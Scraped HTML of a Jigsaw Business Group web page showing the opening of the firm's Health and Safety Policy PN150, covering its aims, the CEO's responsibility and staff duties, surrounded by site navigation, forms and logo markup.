	<li id="menu-item-412" class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-412"><a href="https://jigsawbusinessgroup.com/business-ir35-support-services/">IR35 Support Services</a></li>
	<li id="menu-item-358" class="title col-3 menu-item menu-item-type-custom menu-item-object-custom menu-item-358"><a>Sustainable Solutions</a></li>
	<li id="menu-item-417" class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-417"><a href="https://jigsawbusinessgroup.com/solar-pv-maintenance/">Solar PV Maintenance</a></li>
	<li id="menu-item-420" class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-420"><a href="https://jigsawbusinessgroup.com/solar-pv-repair/">Solar PV Repair</a></li>
	<li id="menu-item-423" class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-423"><a href="https://jigsawbusinessgroup.com/solar-pv-warranty/">Solar PV Warranty</a></li>
	<li id="menu-item-426" class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-426"><a href="https://jigsawbusinessgroup.com/solar-pv-upgrade/">Solar PV Upgrade</a></li>
	<li id="menu-item-359" class="title col-3 menu-item menu-item-type-custom menu-item-object-custom menu-item-359"><a>Digital Solutions</a></li>
	<li id="menu-item-8119" class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-8119"><a href="https://jigsawbusinessgroup.com/jigsawsafe/">Jigsawsafe™</a></li>
</ul>
</li>
<li id="menu-item-351" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-351"><a>Industries</a>
<ul class="sub-menu">
	<li id="menu-item-360" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-360"><a href="https://jigsawbusinessgroup.com/sectors/manufacturing/">Manufacturing</a></li>
	<li id="menu-item-379" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-379"><a href="https://jigsawbusinessgroup.com/sectors/transportation/">Transportation</a></li>
	<li id="menu-item-430" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-430"><a href="https://jigsawbusinessgroup.com/sectors/warehousing-and-logistics/">Warehousing and Logistics</a></li>
	<li id="menu-item-433" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-433"><a href="https://jigsawbusinessgroup.com/sectors/renewable-energy/">Renewable Energy</a></li>
	<li id="menu-item-436" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-436"><a href="https://jigsawbusinessgroup.com/sectors/engineering/">Engineering</a></li>
	<li id="menu-item-439" class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-439"><a href="https://jigsawbusinessgroup.com/sectors/construction/">Construction</a></li>
</ul>
</li>
<li id="menu-item-9528" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9528"><a href="https://jigsawbusinessgroup.com/case-studies-testimonials/">Case Studies/Testimonials</a>
<ul class="sub-menu">
	<li id="menu-item-381" class="menu-item menu-item-type-post_type_archive menu-item-object-case-studies menu-item-381"><a href="https://jigsawbusinessgroup.com/case-studies/">Case Studies</a></li>
	<li id="menu-item-9530" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9530"><a href="https://jigsawbusinessgroup.com/client-testimonials/">B2B Testimonials</a></li>
	<li id="menu-item-9531" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9531"><a href="https://jigsawbusinessgroup.com/customer-testimonials/">B2C Testimonials</a></li>
	<li id="menu-item-9529" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9529"><a href="https://jigsawbusinessgroup.com/candidate-testimonials/">Candidate Testimonials</a></li>
	<li id="menu-item-9532" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9532"><a href="https://jigsawbusinessgroup.com/contractor-testimonials/">Contractor Testimonials</a></li>
</ul>
</li>
<li id="menu-item-346" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-346"><a href="https://jigsawbusinessgroup.com/blogs/">Blogs/News</a></li>
<li id="menu-item-349" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-349"><a href="https://jigsawbusinessgroup.com/vacancies/">Vacancies</a></li>
<li id="menu-item-354" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-354"><a>About Us</a>
<ul class="sub-menu">
	<li id="menu-item-535" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><a href="https://jigsawbusinessgroup.com/meet-the-team/">Meet the Team</a></li>
	<li id="menu-item-8165" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8165"><a href="https://jigsawbusinessgroup.com/why-choose-us/">Why choose us</a></li>
	<li id="menu-item-532" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-532"><a href="https://jigsawbusinessgroup.com/glossary/">Glossary</a></li>
</ul>
</li>
<li id="menu-item-347" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-347"><a href="https://jigsawbusinessgroup.com/contact/">Contact Us</a></li>
</ul></div>            <button onclick="consultationForm.showModal();" class="cta-button">Book Free Consultation</button>
		</nav><!-- #site-navigation -->
        </div>
        </div>

        <div id="headeVacancies" class="header-vacancies">
                <h4>Latest Vacancies</h4>
                        <div class="recent-jobs">
                         

                        <a class="recent-job" href="https://jigsawbusinessgroup.com/vacancies/senior-buyer-indirect-interim/ "> 
                            <div class="job-title">SENIOR BUYER – INDIRECT &#8211; INTERIM</div> 
                            <svg xmlns="http://www.w3.org/2000/svg" width="17" height="26" viewBox="0 0 17 26" fill="none">
                                <path d="M3 23L14 13L3 3" stroke="#00416A" stroke-width="3" stroke-miterlimit="10" stroke-linecap="square"/>
                            </svg>
                        </a> 

                 

                        <a class="recent-job" href="https://jigsawbusinessgroup.com/vacancies/program-manager-interim-czech-republic/ "> 
                            <div class="job-title">PROGRAM MANAGER – INTERIM</div> 
                            <svg xmlns="http://www.w3.org/2000/svg" width="17" height="26" viewBox="0 0 17 26" fill="none">
                                <path d="M3 23L14 13L3 3" stroke="#00416A" stroke-width="3" stroke-miterlimit="10" stroke-linecap="square"/>
                            </svg>
                        </a> 

                 

                        <a class="recent-job" href="https://jigsawbusinessgroup.com/vacancies/interim-maintenance-expert-manager-plc-robotics-belfast/ "> 
                            <div class="job-title">INTERIM MAINTENANCE EXPERT/MANAGER (PLC &#038; Robotics)</div> 
                            <svg xmlns="http://www.w3.org/2000/svg" width="17" height="26" viewBox="0 0 17 26" fill="none">
                                <path d="M3 23L14 13L3 3" stroke="#00416A" stroke-width="3" stroke-miterlimit="10" stroke-linecap="square"/>
                            </svg>
                        </a> 

                 
                        </div>
        </div>


        <div class="mobile-nav"> 
            <div id="nav-drill" class="nav-drill"> 
                 <div class="custom-menu-class"><ul id="menu-menu-1" class="menu"><li class="expertise menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-350"><div class="nav-item"><a>Expertise</a></div>
<ul class="sub-menu">
	<li class="title col-2 menu-item menu-item-type-custom menu-item-object-custom menu-item-356"><div class="nav-item"><a>Business Consultancy</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-348"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/supply-chain/">Supply Chain</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-395"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/business-improvement-support/">Business Improvement/Support</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-399"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/project-management/">Project Management</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-404"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/business-training-and-development/">Business Training and Development</a></div></li>
	<li class="title col-2 menu-item menu-item-type-custom menu-item-object-custom menu-item-357"><div class="nav-item"><a>Recruitment Specialist</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-408"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/client-recruitment/">Client Recruitment</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-413"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/vacancies/">Candidate &#8211; Vacancies</a></div></li>
	<li class="col-2 menu-item menu-item-type-post_type menu-item-object-page menu-item-412"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/business-ir35-support-services/">IR35 Support Services</a></div></li>
	<li class="title col-3 menu-item menu-item-type-custom menu-item-object-custom menu-item-358"><div class="nav-item"><a>Sustainable Solutions</a></div></li>
	<li class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-417"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/solar-pv-maintenance/">Solar PV Maintenance</a></div></li>
	<li class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-420"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/solar-pv-repair/">Solar PV Repair</a></div></li>
	<li class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-423"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/solar-pv-warranty/">Solar PV Warranty</a></div></li>
	<li class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-426"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/solar-pv-upgrade/">Solar PV Upgrade</a></div></li>
	<li class="title col-3 menu-item menu-item-type-custom menu-item-object-custom menu-item-359"><div class="nav-item"><a>Digital Solutions</a></div></li>
	<li class="col-3 menu-item menu-item-type-post_type menu-item-object-page menu-item-8119"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/jigsawsafe/">Jigsawsafe™</a></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-351"><div class="nav-item"><a>Industries</a></div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-360"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/manufacturing/">Manufacturing</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-379"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/transportation/">Transportation</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-430"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/warehousing-and-logistics/">Warehousing and Logistics</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-433"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/renewable-energy/">Renewable Energy</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-436"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/engineering/">Engineering</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-sectors menu-item-439"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/sectors/construction/">Construction</a></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9528"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/case-studies-testimonials/">Case Studies/Testimonials</a></div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type_archive menu-item-object-case-studies menu-item-381"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/case-studies/">Case Studies</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9530"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/client-testimonials/">B2B Testimonials</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9531"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/customer-testimonials/">B2C Testimonials</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9529"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/candidate-testimonials/">Candidate Testimonials</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9532"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/contractor-testimonials/">Contractor Testimonials</a></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-346"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/blogs/">Blogs/News</a></div></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-349"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/vacancies/">Vacancies</a></div></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-354"><div class="nav-item"><a>About Us</a></div>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-535"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/meet-the-team/">Meet the Team</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8165"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/why-choose-us/">Why choose us</a></div></li>
	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-532"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/glossary/">Glossary</a></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-347"><div class="nav-item"><a href="https://jigsawbusinessgroup.com/contact/">Contact Us</a></div></li>
</ul></div> 
                <button onclick="consultationForm.showModal();" class="cta-button">Book Free Consultation</button>
            </div> 
        </div>


	</header><!-- #masthead -->

    <script>
        var translateScript = document.createElement('script');
    if( window.innerWidth < 900 ) {
        translateScript.setAttribute('src','https://cdn.gtranslate.net/widgets/latest/popup.js');
    }else{
        translateScript.setAttribute('src', 'https://cdn.gtranslate.net/widgets/latest/dropdown.js');
    }
    document.head.appendChild(translateScript);
    </script>

    <main id="primary" class="site-main">
        <div class="page-container">
            <h1>Health and Safety Policy</h1>
		    <p><strong>Health and Safety Policy PN150</strong></p>
<p><b><span data-contrast="none">Introduction</span></b><span data-ccp-props="{"> </span></p>
<p><span data-contrast="none">This policy sets out the company’s commitment to health and safety at work. It applies to all employees, visitors, suppliers and members of the general public that enter our premises or any location where Jigsaw Business Group is carrying out work related activities outside of our premises.</span><span data-ccp-props="{"> </span></p>
<p><span data-contrast="none">Our aim is to ensure that where possible we eliminate risks and control the hazards that may cause injury in or at the workplace – providing a safe working environment and preventing work related injuries</span><span data-contrast="none">. </span><span data-ccp-props="{"> </span></p>
<p><span data-contrast="none">So that we can achieve our aims we will:</span><span data-ccp-props="{"> </span></p>
<ul>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="1" data-aria-level="1"><span data-contrast="none">Follow all Legal requirements for Health and Safety at Work </span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="2" data-aria-level="1"><span data-contrast="none">Designate Health and Safety responsibilities as appropriate</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="3" data-aria-level="1"><span data-contrast="none">Implement arrangements that will achieve our aims</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="4" data-aria-level="1"><span data-contrast="none">Regularly measure ourselves against such arrangements </span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="5" data-aria-level="1"><span data-contrast="none">Analise risk and Implement actions to achieve Continuous Improvement accordingly</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="6" data-aria-level="1"><span data-contrast="none">Carry out the appropriate training</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="3" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="7" data-aria-level="1"><span data-contrast="none">Seek advice from qualified Health and Safety subject matter experts where required </span><span data-ccp-props="{"> </span></li>
</ul>
<p><span data-contrast="none">The “Arrangements” section below details our Statement of General Policy (our aims) and what we are going to do to achieve our aims (arrangements).</span><span data-ccp-props="{"> </span></p>
<p><strong> </strong></p>
<p><strong>Responsibilities </strong></p>
<p><span data-contrast="none">Steve Spratt (CEO) has overall and final responsibility for health and safety and day-to-day responsibility for ensuring this policy is put into practice.</span><span data-ccp-props="{"> </span></p>
<p><span data-contrast="none">All employees, visitors, suppliers and members of the general public that enter our premises or any location where Jigsaw Business Group is carrying out work related activities outside of our premises, have a responsibility to:</span><span data-ccp-props="{"> </span></p>
<ul>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="1" data-aria-level="1"><span data-contrast="none">Follow safety instructions and signs</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="2" data-aria-level="1"><span data-contrast="none">Participate in relevant training / awareness sessions </span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="3" data-aria-level="1"><span data-contrast="none">Report hazards / accidents and dangerous occurrences</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="4" data-aria-level="1"><span data-contrast="none">Look after their own and others safety</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="5" data-aria-level="1"><span data-contrast="none">Ensure Personal Protective Equipment (PPE) is in good working order, used when necessary and if damaged or lost sought replacements.</span><span data-ccp-props="{"> </span></li>
<li data-leveltext="" data-font="Symbol" data-listid="5" data-list-defn-props="{" aria-setsize="-1" data-aria-posinset="6" data-aria-level="1"><span data-contrast="none">To abide by any additional Health and Safety rules in place on customers sites and or in any plcace Jigsaw Business Group work is to take place.</span><span data-ccp-props="{"> </span></li>
</ul>
<p><b><span data-contrast="none">Arrangements</span></b><span data-ccp-props="{"> </span></p>
<p>&nbsp;</p>
<p><b><span data-contrast="none">Items &amp; Locations</span></b><span data-ccp-props="{"> </span><span data-ccp-props="{"> </span></p>
<p><span data-contrast="none">This table provides confirmation of where important items relating to Health and Safety are located:</span><span data-ccp-props="{"> </span></p>
<p>&nbsp;</p>
        </div>

	</main><!-- #main -->

    <dialog id="consultationForm">
        <button onclick="consultationForm.close();" class="close-button">X</button>
        <div class="form-con">
            <div class="content">
                <h2>Book your free consulation</h2>
                <p>Fill in your details and one of our expert consultants will be in touch as soon as possible to arrange a suitable date and time for your consultation.</p>
            </div>
            <div class="form">
                
<div class="wpcf7 no-js" id="wpcf7-f172-o1" lang="en-GB" dir="ltr">
<div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
<form action="/health-and-safety-policy/#wpcf7-f172-o1" method="post" class="wpcf7-form init" aria-label="Contact form" novalidate="novalidate" data-status="init">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="172" />
<input type="hidden" name="_wpcf7_version" value="5.9.3" />
<input type="hidden" name="_wpcf7_locale" value="en_GB" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f172-o1" />
<input type="hidden" name="_wpcf7_container_post" value="0" />
<input type="hidden" name="_wpcf7_posted_data_hash" value="" />
<input type="hidden" name="_wpcf7_recaptcha_response" value="" />
</div>
<span class="wpcf7-form-control-wrap" data-name="your-name"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" autocomplete="name" aria-required="true" aria-invalid="false" placeholder="Full Name*" value="" type="text" name="your-name" /></span> 

<span class="wpcf7-form-control-wrap" data-name="your-email"><input size="40" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" autocomplete="email" aria-required="true" aria-invalid="false" placeholder="Email Address*" value="" type="email" name="your-email" /></span> 

<span class="wpcf7-form-control-wrap" data-name="tel-no"><input size="40" class="wpcf7-form-control wpcf7-tel wpcf7-text wpcf7-validates-as-tel" aria-invalid="false" placeholder="Phone Number" value="" type="tel" name="tel-no" /></span>

<span class="wpcf7-form-control-wrap" data-name="service"><select class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required" aria-required="true" aria-invalid="false" name="service"><option value="Select a Service*">Select a Service*</option><option value="Business Consultancy">Business Consultancy</option><option value="Recruitment Specialist">Recruitment Specialist</option><option value="Sustainable Solutions">Sustainable Solutions</option><option value="Digital Solutions">Digital Solutions</option></select></span>

<span class="wpcf7-form-control-wrap" data-name="your-message"><textarea cols="40" rows="5" class="wpcf7-form-control wpcf7-textarea" aria-invalid="false" placeholder="Message" name="your-message"></textarea></span> 

<div class="form-checkbox"><span class="wpcf7-form-control-wrap" data-name="acceptance-box"><span class="wpcf7-form-control wpcf7-acceptance"><span class="wpcf7-list-item"><label><input type="checkbox" name="acceptance-box" value="1" aria-invalid="false" /><span class="wpcf7-list-item-label">I agree to allow Jigsaw Business Group to contact me via the above methods.</span></label></span></span></span></div>

<input class="wpcf7-form-control wpcf7-submit has-spinner" type="submit" value="Submit" /><div class="wpcf7-response-output" aria-hidden="true"></div>
</form>
</div>
                <p>Fields marked with (*) must be completed</p>
            </div>
        </div>
    </dialog>
    
	<footer id="colophon" class="site-footer">
		<section class="newsletter">
            <div class="page-container">
                <div class="newsletter-con">
                    <h2>Sign up to our Newsletter</h2>
                    <p class="sub-text">Never miss an update from us and get key insights from our team by signing up to the Jigsaw newsletter.</p>
                    <div class="form">
<div class="wpcf7 no-js" id="wpcf7-f164-o2" lang="en-GB" dir="ltr">
<div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
<form action="/health-and-safety-policy/#wpcf7-f164-o2" method="post" class="wpcf7-form init" aria-label="Contact form" novalidate="novalidate" data-status="init">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="164" />
<input type="hidden" name="_wpcf7_version" value="5.9.3" />
<input type="hidden" name="_wpcf7_locale" value="en_GB" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f164-o2" />
<input type="hidden" name="_wpcf7_container_post" value="0" />
<input type="hidden" name="_wpcf7_posted_data_hash" value="" />
<input type="hidden" name="_wpcf7_recaptcha_response" value="" />
</div>
<span class="wpcf7-form-control-wrap" data-name="your-email"><input size="40" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="Enter Email Address" value="" type="email" name="your-email" /></span>

<input class="wpcf7-form-control wpcf7-submit has-spinner" type="submit" value="Sign Up" /><div class="wpcf7-response-output" aria-hidden="true"></div>
</form>
</div>
</div>
                </div>
                <div class="newsletter-submitted">
                    <h2>Thank you for you intrest!</h2>
                </div>
            </div>
        </section>

        <section class="main-footer">
            <div class="page-container">
                <div class="footer-con">
                    <div class="footer-col">
                    <svg xmlns="http://www.w3.org/2000/svg" width="190" height="70" viewBox="0 0 190 70" fill="none">
                        <g clip-path="url(#clip0_937_17599)">
                        <path d="M82.241 39.1101C80.4296 39.1101 78.9292 38.735 77.7325 37.9883C76.5538 37.2557 75.5524 36.2812 74.804 35.1349L76.7672 33.5645C77.3962 34.5004 78.2025 35.3137 79.1425 35.9552C80.0862 36.5266 81.1853 36.8105 82.2952 36.7719C83.5642 36.8 84.7826 36.3057 85.6504 35.4083C86.547 34.5004 86.9953 33.1613 86.9953 31.3876V16.3528H89.7141V31.356C89.7394 32.5339 89.5442 33.7082 89.1357 34.8194C88.7958 35.7378 88.2499 36.5686 87.5376 37.2557C86.1674 38.4931 84.403 39.1136 82.241 39.1101Z" fill="#00476D"/>
                        <path d="M95.8098 15.8726H98.8432V18.5963H95.8098V15.8726ZM95.9834 22.2174H98.6335V38.7911H95.9834V22.2174Z" fill="#00476D"/>
                        <path d="M112.687 43.9756C111.248 43.9826 109.813 43.7898 108.428 43.4077C107.072 43.0186 105.781 42.4367 104.606 41.676L105.799 39.7691C106.805 40.4386 107.9 40.9644 109.053 41.3395C110.221 41.7111 111.44 41.8969 112.669 41.8864C114.643 41.8864 116.208 41.3886 117.369 40.393C118.53 39.3975 119.115 37.9287 119.126 35.9867V34.0307C118.327 35.0017 117.358 35.8325 116.266 36.4845C115.019 37.2031 113.584 37.5607 112.134 37.5116C111.071 37.5116 110.015 37.3258 109.017 36.9647C108.037 36.6107 107.13 36.0814 106.349 35.4083C105.561 34.7248 104.925 33.8975 104.473 32.972C103.984 31.966 103.735 30.8653 103.749 29.7505V29.6875C103.702 27.5071 104.646 25.4143 106.331 23.9666C107.119 23.29 108.03 22.7607 109.017 22.4102C110.008 22.0526 111.056 21.8668 112.116 21.8668C112.889 21.8598 113.659 21.951 114.408 22.1367C115.066 22.305 115.702 22.5469 116.302 22.8589C116.852 23.1498 117.365 23.5039 117.832 23.9105C118.28 24.3066 118.696 24.7343 119.072 25.1935V22.2104H121.726V35.8816C121.747 37.0348 121.548 38.1811 121.14 39.2643C120.771 40.2002 120.196 41.0486 119.451 41.7461C118.62 42.5103 117.618 43.0817 116.523 43.4147C115.283 43.7933 113.988 43.9826 112.687 43.9756ZM112.651 35.3207C113.482 35.3207 114.31 35.1875 115.095 34.9211C115.858 34.6652 116.563 34.2726 117.181 33.7678C117.777 33.27 118.269 32.6671 118.627 31.987C119 31.2824 119.191 30.5042 119.18 29.712V29.6489C119.195 28.8461 119.003 28.0539 118.627 27.3388C118.269 26.6658 117.777 26.0733 117.181 25.5861C116.559 25.0918 115.854 24.7062 115.095 24.4503C114.31 24.1804 113.482 24.0472 112.651 24.0472C111.834 24.0437 111.024 24.1804 110.257 24.4503C109.538 24.7027 108.873 25.0848 108.294 25.5721C107.726 26.0558 107.275 26.6553 106.967 27.3248C106.638 28.0504 106.472 28.8391 106.486 29.6349V29.698C106.476 30.4832 106.645 31.2649 106.982 31.98C107.3 32.6566 107.759 33.2595 108.327 33.7573C108.902 34.2585 109.567 34.6476 110.29 34.9105C111.042 35.191 111.845 35.3347 112.651 35.3277V35.3207Z" fill="#00476D"/>
                        <path d="M133.555 39.1102C132.228 39.1032 130.912 38.8823 129.661 38.4547C128.41 38.0481 127.235 37.4451 126.183 36.6739L127.528 34.9212C128.447 35.5837 129.463 36.1131 130.54 36.4916C131.549 36.8492 132.615 37.035 133.693 37.0385C134.629 37.0771 135.555 36.8317 136.343 36.3374C137.008 35.9132 137.399 35.1841 137.377 34.4129V34.3498C137.384 33.9712 137.258 33.5997 137.015 33.2982C136.744 32.9757 136.412 32.7093 136.035 32.513C135.573 32.2711 135.088 32.0713 134.589 31.9206C134.051 31.7488 133.505 31.57 132.919 31.4403C132.232 31.2475 131.538 31.0372 130.836 30.8128C130.171 30.606 129.535 30.3221 128.942 29.9645C128.392 29.6385 127.922 29.2003 127.564 28.6815C127.192 28.1066 127.004 27.4371 127.029 26.7606V26.694C127.022 26.0244 127.178 25.3584 127.478 24.7555C127.778 24.17 128.208 23.6547 128.736 23.2481C129.311 22.8134 129.965 22.4874 130.663 22.2876C131.451 22.0528 132.268 21.9336 133.093 21.9371C134.224 21.9406 135.352 22.1089 136.433 22.4349C137.511 22.7433 138.541 23.192 139.499 23.7634L138.292 25.6248C137.478 25.134 136.603 24.7414 135.692 24.454C134.832 24.17 133.931 24.0228 133.024 24.0193C132.131 23.9772 131.245 24.2226 130.511 24.7204C129.929 25.1095 129.578 25.7475 129.578 26.4346V26.4977C129.571 26.8692 129.708 27.2268 129.958 27.5072C130.244 27.8192 130.587 28.0751 130.974 28.2609C131.44 28.4922 131.921 28.685 132.42 28.8393C132.97 29.011 133.544 29.1793 134.141 29.3511C134.832 29.5439 135.515 29.7577 136.191 29.9926C136.842 30.2169 137.46 30.5184 138.035 30.89C138.566 31.2335 139.015 31.6822 139.358 32.2045C139.709 32.7759 139.879 33.4349 139.857 34.0974V34.1605C139.871 34.8897 139.702 35.6118 139.358 36.2638C139.029 36.8667 138.574 37.396 138.017 37.8167C137.42 38.2619 136.741 38.5914 136.017 38.7947C135.218 39.0156 134.387 39.1207 133.555 39.1102Z" fill="#00476D"/>
                        <path d="M150.118 39.1416C149.293 39.1416 148.469 39.0365 147.674 38.8226C146.907 38.6263 146.18 38.2933 145.537 37.8446C144.926 37.4135 144.416 36.8631 144.04 36.2251C143.65 35.5381 143.454 34.7634 143.472 33.9816V33.9185C143.454 33.1018 143.642 32.292 144.022 31.5629C144.394 30.8863 144.933 30.3079 145.591 29.8803C146.329 29.4035 147.142 29.0565 148.003 28.8532C149.011 28.6113 150.045 28.4921 151.083 28.5026C152.081 28.4921 153.075 28.5552 154.062 28.6919C154.894 28.8181 155.714 28.9934 156.524 29.2072V28.6954C156.524 27.2302 156.065 26.1225 155.147 25.3688C154.228 24.6151 152.93 24.24 151.256 24.2365C150.284 24.226 149.311 24.3347 148.364 24.559C147.496 24.7764 146.65 25.0638 145.833 25.4249L145.042 23.3917C146.01 22.9641 147.012 22.61 148.039 22.3401C149.178 22.0667 150.345 21.9335 151.517 21.951C154.04 21.951 155.957 22.5609 157.269 23.7773C158.505 24.9446 159.124 26.5712 159.127 28.6499V38.7806H156.513V36.3268C155.819 37.133 154.97 37.8026 154.015 38.2968C152.811 38.8963 151.47 39.1872 150.118 39.1416ZM150.653 37.1225C151.434 37.1295 152.207 37.0209 152.956 36.8035C153.628 36.6107 154.261 36.3022 154.825 35.8956C155.346 35.5205 155.779 35.0438 156.094 34.4934C156.409 33.9396 156.568 33.3191 156.56 32.6881V31.1563C155.895 30.988 155.139 30.8303 154.293 30.6795C153.328 30.5218 152.352 30.4482 151.376 30.4552C149.727 30.4552 148.451 30.7601 147.547 31.3666C146.694 31.8854 146.18 32.7968 146.191 33.7748V33.8379C146.184 34.3287 146.307 34.8124 146.553 35.2401C146.791 35.6572 147.128 36.0183 147.533 36.2917C147.97 36.5757 148.451 36.793 148.957 